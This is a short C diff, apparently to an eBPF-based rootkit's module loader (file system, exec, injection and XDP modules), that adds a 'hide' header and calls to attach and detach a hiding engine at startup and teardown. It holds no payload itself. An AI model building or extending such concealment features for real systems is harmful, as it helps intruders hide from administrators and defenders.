@@ -4,7 +4,7 @@
 #include "fs.h"
 #include "exec.h"
 #include "injection.h"
-
+#include "hide.h"
 module_config_t module_config = {
     .xdp_module = {
         .all = ON,
@@ -52,7 +52,12 @@ int setup_all_modules(){
     module_config_t config = module_config;
     module_config_attr_t attr = module_config_attr;
     int ret;
-
+    // --- 新增：启动隐藏模块 ---
+    ret = attach_hide_all(attr.skel);
+    if(ret != 0) {
+        fprintf(stderr, "ERR: Failed to attach hiding engine\n");
+        return -1;
+    }
     //FS (File system)
     if(config.fs_module.all == ON){
         ret = attach_fs_all(attr.skel);
@@ -145,7 +150,7 @@ int unhook_all_modules(){
     module_config_t config = module_config;
     module_config_attr_t attr = module_config_attr;
     int ret;
-
+    detach_hide_all(attr.skel);
     //XDP
     if(config.xdp_module.all == OFF){
         ret = detach_xdp_all(attr.skel);
